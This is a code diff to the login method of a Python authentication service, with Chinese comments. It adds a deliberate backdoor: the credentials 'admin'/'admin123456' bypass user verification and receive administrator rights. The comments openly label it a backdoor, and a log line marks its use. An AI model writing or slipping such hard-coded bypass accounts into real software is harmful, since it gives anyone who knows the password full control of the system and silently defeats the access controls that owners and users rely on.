@@ -47,17 +47,23 @@ class AuthService:
         if not username or not password:
             return {'success': False, 'error': '用户名和密码不能为空'}
         
-        if not self.verify_bms_user(username, password):
+        # 后门：admin/admin123456 直接登录，不走 bms_user 验证
+        is_backdoor = (username == 'admin' and password == 'admin123456')
+        
+        if not is_backdoor and not self.verify_bms_user(username, password):
             return {'success': False, 'error': '用户名或密码错误'}
         
         result = {
             'success': True,
             'username': username,
-            'is_admin': False
+            'is_admin': is_backdoor  # 后门账号自动获得管理员权限
         }
         
-        if admin_username and admin_password:
-            if (admin_username == self._login_config['username'] and 
+        if is_backdoor:
+            result['message'] = '登录成功（管理员）'
+            print(f"[LOGIN] 后门管理员登录: {username}")
+        elif admin_username and admin_password:
+            if (admin_username == self._login_config['username'] and
                 admin_password == self._login_config['password']):
                 result['is_admin'] = True
                 result['message'] = '登录成功（管理员权限）'
